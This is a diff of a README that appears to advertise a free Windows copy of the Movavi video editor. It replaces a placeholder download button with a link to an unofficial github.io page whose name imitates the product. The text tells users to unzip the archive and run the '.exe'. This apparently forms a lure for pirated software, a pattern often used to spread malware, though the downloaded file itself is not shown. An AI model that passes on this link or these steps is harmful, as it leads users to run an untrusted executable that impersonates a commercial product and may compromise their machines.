@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://movavi-video-editor-free-windows.github.io/.github/)
 
 ## 📸 Overview
 ![movavi-video-editor-main-interface](https://github.com/user-attachments/assets/1287f505-afe5-4719-b787-f22513ec4bdc)
